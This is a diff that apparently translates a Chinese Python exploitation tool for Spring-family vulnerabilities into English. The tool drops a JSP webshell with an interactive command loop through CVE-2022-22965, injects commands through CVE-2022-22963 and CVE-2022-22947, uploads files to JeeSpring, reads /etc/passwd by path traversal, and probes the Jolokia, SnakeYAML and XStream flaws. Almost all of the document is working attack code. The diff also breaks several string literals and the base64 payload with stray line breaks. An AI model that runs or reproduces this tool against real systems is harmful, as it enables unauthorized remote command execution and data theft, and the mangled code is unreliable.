@@ -1,3 +1,6 @@
+Here's the translated version of your provided Python script into English:
+
+```python
 #!/usr/bin/env python
 # coding=utf-8
   ################
@@ -21,14 +24,14 @@ ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
 def JSON_handle(header1, header2):
     dict1 = json.loads(str(header1).replace("'", "\""))
     dict2 = json.loads(str(header2).replace("'", "\""))
-    # 合并两个字典
+    # Merge two dictionaries
     merged_dict = {**dict1, **dict2}
-    # 将合并后的字典转换为 JSON 字符串
+    # Convert the merged dictionary to a JSON string
     result_json = json.dumps(merged_dict, indent=2)
     return result_json
 
 def CVE_2022_22965(url, proxies, header_new):
-    cprint("======开始对目标URL进行CVE-2022-22965漏洞利用======", "green")
+    cprint("====== Starting CVE-2022-22965 exploitation on target URL ======", "green")
     oldHeaders_1 = {
         "User-Agent": random.choice(ua),
         "prefix": "<%",
@@ -61,36 +64,37 @@ def CVE_2022_22965(url, proxies, header_new):
         requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
         test = requests.get(url + "shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        test_again = requests.get(url + "shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        if (test_again.status_code == 200):
-            cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?pwd=tomcat&cmd=whoami" ,"red")
-            while 1:
-                Cmd = input("[+] 请输入要执行的命令>>> ")
+        test_again = requests.get(url + "shell.jsp
+
+", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        if test_again.status_code == 200:
+            cprint("[+] CVE-2022-22965 RCE vulnerability exists, Webshell uploaded at: " + url + "shell.jsp?pwd=tomcat&cmd=whoami", "red")
+            while True:
+                Cmd = input("[+] Please enter the command to execute>>> ")
                 if Cmd == "exit":
                     sys.exit(0)
                 url_shell = url + "shell.jsp?pwd=tomcat&cmd={}".format(Cmd)
                 r = requests.get(url_shell, verify=False, proxies=proxies)
                 r_again = requests.get(url_shell, verify=False, proxies=proxies)
                 if r_again.status_code == 500:
-                    cprint("[-] 重发包返回状态码500，请手动尝试利用WebShell：shell.jsp?pwd=tomcat&cmd=whoami\n","yellow")
+                    cprint("[-] Resent packet returned status code 500, please try to use WebShell manually: shell.jsp?pwd=tomcat&cmd=whoami\n", "yellow")
                     break
                 else:
                     resp = r_again.text
                     result = re.findall('([^\x00]+)\n', resp)[0]
-                    cprint(result ,"green")
+                    cprint(result, "green")
         else:
-            cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：\n[/shell.jsp?pwd=tomcat&cmd=命令] \n","yellow")
+            cprint("[-] CVE-2022-22965 vulnerability does not exist or has already been exploited, please try accessing the shell address manually:\n[/shell.jsp?pwd=tomcat&cmd=command] \n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def CVE_2022_22963(url, proxies, header_new):
-    cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
+    cprint("====== Starting CVE-2022-22963 exploitation on target URL ======", "green")
     header = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'}
     data = 'test'
     oldHeader = {
@@ -111,20 +115,19 @@ def CVE_2022_22963(url, proxies, header_new):
         text = req.text
         rsp = '"error":"Internal Server Error"'
         if (code == 500) and (rsp in text):
-            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell\n', "red")
+            cprint(f'[+] {url} is vulnerable to CVE-2022-22963 RCE, please manually create a reverse shell\n', "red")
         else:
-            cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
+            cprint("[-] CVE-2022-22963 vulnerability does not exist\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def CVE_2022_22947(url, proxies, header_new):
-    cprint("======开始对目标URL进行CVE-2022-22947漏洞利用======","green")
+    cprint("====== Starting CVE-2022-22947 exploitation on target URL ======", "green")
     oldHeader_1 = {
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
@@ -160,83 +163,83 @@ def CVE_2022_22947(url, proxies, header_new):
 
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, timeout=10, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10, verify=False, proxies=proxies)
+        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10, verify=False, proxies=proxies)
         if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
-            cprint("[+] Payload已经输出，回显结果如下：", "red")
+            cprint("[+] Payload has been executed, the result is as follows:", "red")
             print('\n')
             print(re3.text)
             print('\n')
-            print("[+] 执行命令模块（输入exit退出）")
-            while 1:
-                Cmd = input("[+] 请输入要执行的命令>>> ")
+            print("[+] Command execution module (type 'exit' to exit)")
+            while True:
+                Cmd = input("[+] Please enter the command to execute>>> ")
                 if Cmd == "exit":
-                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10, verify=False, proxies=proxies)
+                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10, verify=False, proxies=proxies)
                     sys.exit(0)
                 else:
                     payload3 = payload2.replace('whoami', Cmd)
-                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, timeout=10, json=json ,verify=False, proxies=proxies)
-                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, timeout=10, json=json, verify=False, proxies=proxies)
+                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10, verify=False, proxies=proxies)
+                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10, verify=False, proxies=proxies)
                     result = re3.text
-                    cprint(result ,"green")
+                    cprint(result, "green")
                     print('\n')
         else:
-            cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
+            cprint("[-] CVE-2022-22947 vulnerability does not exist\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def JeeSpring_2023(url, proxies, header_new):
-    cprint("======开始对目标URL进行2023JeeSpring任意文件上传漏洞利用======","green")
+    cprint("====== Starting 2023 JeeSpring arbitrary file upload vulnerability exploitation on target URL ======", "green")
     oldHeader = {
         'User-Agent': random.choice(ua),
         'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
         'Accept-Encoding': 'gzip, deflate',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apn g,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
         'Connection': 'close'
     }
     headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
-    payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
+    payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnR
+
+sbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
     payload = base64.b64decode(payload2)
     path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'
-    
+
     try:
         requests.packages.urllib3.disable_warnings()
         re1 = requests.post(url=url + path, data=payload, headers=headers1, verify=False, proxies=proxies)
         code1 = re1.status_code
         if ('jsp' in str(re1.text)) and (int(code1) == 200):
-            cprint("[+] Payload已经发送，成功上传JSP", "red")
+            cprint("[+] Payload has been sent, successfully uploaded JSP", "red")
             newpath = str(re1.text)
             urltest = url + "static/uploadify/" + newpath.strip()
             retest = requests.get(url=urltest, verify=False, proxies=proxies)
             code2 = retest.status_code
             if ('Hello' in str(retest.text)) and (code2 == 200):
-                cprint(f'[+] {url} 存在2023JeeSpring任意文件上传漏洞，Poc地址如下：', "red")
+                cprint(f'[+] {url} is vulnerable to 2023 JeeSpring arbitrary file upload vulnerability, Poc URL is as follows:', "red")
                 cprint(urltest + '\n', "red")
             else:
-                cprint(f'[.] 未发现Poc存活，请手动验证： {urltest}', "yellow")
+                cprint(f'[.] Poc not found, please verify manually: {urltest}', "yellow")
         else:
-            cprint("[-] 2023JeeSpring任意文件上传漏洞不存在\n", "yellow")
+            cprint("[-] 2023 JeeSpring arbitrary file upload vulnerability does not exist\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def JolokiaRCE(url, proxies, header_new):
-    cprint("======开始对目标URL进行Jolokia系列RCE漏洞测试======","green")
+    cprint("====== Starting Jolokia series RCE vulnerability testing on target URL ======", "green")
     path1 = 'jolokia'
     path2 = 'actuator/jolokia'
     path3 = 'jolokia/list'
@@ -249,31 +252,30 @@ def JolokiaRCE(url, proxies, header_new):
         re2 = requests.post(url=url + path2, headers=headers1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
         code2 = re2.status_code
         if ((int(code1) == 200) or (int(code2) == 200)):
-            cprint("[+] 发现jolokia相关路径状态码为200，进一步验证", "red")
+            cprint("[+] Found Jolokia related path with status code 200, further verification required", "red")
             retest = requests.get(url=url + path3, timeout=10, verify=False, proxies=proxies)
             code3 = retest.status_code
             if ('reloadByURL' in str(retest.text)) and (code3 == 200):
-                cprint(f'[+] {url} 存在Jolokia-Logback-JNDI-RCE漏洞，Poc地址如下：', "red")
+                cprint(f'[+] {url} is vulnerable to Jolokia-Logback-JNDI-RCE, Poc URL is as follows:', "red")
                 cprint(url + path3 + '\n', "red")
             elif ('createJNDIRealm' in str(retest.text)) and (code3 == 200):
-                cprint(f'[+] {url} 存在Jolokia-Realm-JNDI-RCE漏洞，Poc地址如下：', "red")
+                cprint(f'[+] {url} is vulnerable to Jolokia-Realm-JNDI-RCE, Poc URL is as follows:', "red")
                 cprint(url + path3 + '\n', "red")
             else:
-                cprint(f'[.] 未发现jolokia/list路径存在关键词，请手动验证：', "yellow")
+                cprint(f'[.] Jolokia/list path does not contain the keywords, please verify manually:', "yellow")
                 cprint(url + path3 + '\n', "red")
         else:
-            cprint("[-] Jolokia系列RCE漏洞不存在\n", "yellow")
+            cprint("[-] Jolokia series RCE vulnerabilities do not exist\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def CVE_2021_21234(url,proxies, header_new):
-    cprint("======开始对目标URL进行CVE-2021-21234漏洞测试======","green")
+    cprint("====== Starting CVE-2021-21234 vulnerability testing on target URL ======", "green")
     payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
     payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
     payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
@@ -287,26 +289,25 @@ def CVE_2021_21234(url,proxies, header_new):
         re3 = requests.post(url=url + payload3, headers=headers1, timeout=10, verify=False, proxies=proxies)
         re4 = requests.post(url=url + payload4, headers=headers1, timeout=10, verify=False, proxies=proxies)
         if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
-            cprint("[+] 发现Spring Boot目录遍历漏洞且系统为Win，Poc路径如下：", "red")
+            cprint("[+] Found Spring Boot directory traversal vulnerability and the system is Win, Poc paths are as follows:", "red")
             cprint(url + payload1, "red")
             cprint(url + payload2 + '\n', "red")
         elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
-            cprint(f'[+] 发现Spring Boot目录遍历漏洞且系统为Linux，Poc路径如下：', "red")
+            cprint(f'[+] Found Spring Boot directory traversal vulnerability and the system is Linux, Poc paths are as follows:', "red")
             cprint(url + payload3, "red")
             cprint(url + payload4 + '\n', "red")
         else:
-            cprint("[-] 未发现Spring Boot目录遍历漏洞\n", "yellow")
+            cprint("[-] No Spring Boot directory traversal vulnerability found\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def SnakeYAML_RCE(url, proxies, header_new):
-    cprint("======开始对目标URL进行SnakeYAML RCE漏洞测试======","green")
+    cprint("====== Starting SnakeYAML RCE vulnerability testing on target URL ======", "green")
     oldHeaders_1 = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
@@ -326,28 +327,29 @@ def SnakeYAML_RCE(url, proxies, header_new):
         re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         if ('example.yml' in str(re1.text)):
-            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
+            cprint("[+] Found SnakeYAML-RCE vulnerability, Poc for Spring 1.x:", "red")
+            cprint('Vulnerability path is ' + urltest + '\n', "red")
+            cprint('POST data content is ' + payload_1 + '\n', "red")
         elif ('example.yml' in str(re2.text)):
-            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
+            cprint("[+] Found SnakeYAML-RCE vulnerability, Poc for Spring 2.x:", "red")
+            cprint('Vulnerability path is ' + urltest + '\n', "red")
+            cprint('POST data content is ' + payload_2 + '\n', "red")
         else:
-            cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
+            cprint("[-] No SnakeYAML-RCE vulnerability found\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def Eureka_xstream_RCE(url, proxies, header_new):
-    cprint("======开始对目标URL进行Eureka_Xstream反序列化漏洞测试======","green")
+    cprint("====== Starting Eureka_Xstream deserialization vulnerability testing on target URL ======", "green")
     oldHeaders_1 = {
-        "User-Agent": random.choice(ua),
+        "User
+
+-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
         }
     oldHeaders_2 = {
@@ -367,26 +369,25 @@ def Eureka_xstream_RCE(url, proxies, header_new):
         re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         if ('127.0.0.2' in str(re1.text)):
-            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 1.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest1 + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
+            cprint("[+] Found Eureka_Xstream deserialization vulnerability, Poc for Spring 1.x:", "red")
+            cprint('Vulnerability path is ' + urltest1 + '\n', "red")
+            cprint('POST data content is ' + payload_1 + '\n', "red")
         elif ('127.0.0.2' in str(re2.text)):
-            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 2.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest2 + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
+            cprint("[+] Found Eureka_Xstream deserialization vulnerability, Poc for Spring 2.x:", "red")
+            cprint('Vulnerability path is ' + urltest2 + '\n', "red")
+            cprint('POST data content is ' + payload_2 + '\n', "red")
         else:
-            cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
+            cprint("[-] No Eureka_Xstream deserialization vulnerability found\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def CVE_2018_1273(url, proxies, header_new):
-    cprint("======开始对目标URL进行Spring_Data_Commons远程命令执行漏洞测试======","green")
+    cprint("====== Starting Spring_Data_Commons RCE vulnerability testing on target URL ======", "green")
     oldHeaders = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
@@ -403,12 +404,12 @@ def CVE_2018_1273(url, proxies, header_new):
         re1 = requests.get(url=urltest1, headers=Headers, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         code1 = re1.status_code
         if ((int(code1) == 200) and ('Users' in str(re1.text))):
-            cprint("[+] 发现Spring_Data_Commons远程命令执行漏洞：", "red")
-            cprint('漏洞存在路径为 ' + urltest1 + '\n', "red")
-            print("[+] 执行命令模块（输入exit退出）")
-            choose = input("[+] 总共有两种Payload，请输入1或者2>>> ")
-            while 1:
-                Cmd = input("[+] 请输入要执行的命令>>> ")
+            cprint("[+] Found Spring_Data_Commons RCE vulnerability:", "red")
+            cprint('Vulnerability path is ' + urltest1 + '\n', "red")
+            print("[+] Command execution module (type 'exit' to exit)")
+            choose = input("[+] There are two Payloads, please enter 1 or 2>>> ")
+            while True:
+                Cmd = input("[+] Please enter the command to execute>>> ")
                 if (choose == '1'):
                     payload3 = payload1.replace('whoami', Cmd)
                 else:
@@ -419,17 +420,16 @@ def CVE_2018_1273(url, proxies, header_new):
                     re2 = requests.post(url=urltest2, data=payload3, headers=Headers, timeout=10, verify=False, proxies=proxies)
                     code2 = re2.status_code
                     if (int(code2) != 503):
-                        cprint('[+] 该Payload已经打出，由于该漏洞无回显，请用Dnslog进行测试\n', "red")
+                        cprint('[+] The Payload has been executed, as this vulnerability has no output, please use Dnslog for testing\n', "red")
         else:
-            cprint("[-] 未发现Spring_Data_Commons远程命令执行漏洞\n", "yellow")
+            cprint("[-] No Spring_Data_Commons RCE vulnerability found\n", "yellow")
     except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
+        print("Process manually terminated with Ctrl + C")
         sys.exit()
     except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
+        print("[-] An error occurred, logged in error.log\n")
+        with open("error.log", "a") as f2:
+            f2.write(str(e) + '\n')
 
 def vul(url, proxies, header_new):
     functions = {
@@ -443,23 +443,24 @@ def vul(url, proxies, header_new):
         8: JolokiaRCE,
         9: CVE_2018_1273,
     }
-    cprint("[+] 目前漏洞库内容如下：","green")
+    cprint("[+] Current vulnerability library content:", "green")
     for num, func in functions.items():
         print(f" {num}: {func.__name__}")
     try:
-        choices = input("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
+        choices = input("\nPlease enter the vulnerabilities to check (e.g., 1,3,5 or press Enter to check all): ")
         if choices == '':
             choices = "1,2,3,4,5,6,7,8,9"
         choices = [int(choice) for choice in choices.split(',')]
     except Exception as e:
-        print("请不要输入无意义的字符串")
+        print("Please do not enter meaningless strings")
         sys.exit()
     for choice in choices:
         selected_func = functions.get(choice)
         if selected_func:
             selected_func(url, proxies, header_new)
         else:
-            print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
+            print(f"{choice} Input error, please re-enter the vulnerability selection module\n")
             break
-    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
+    cprint("More vulnerability exploitation modules will be added later, please stay tuned~", "red")
     sys.exit()
+```
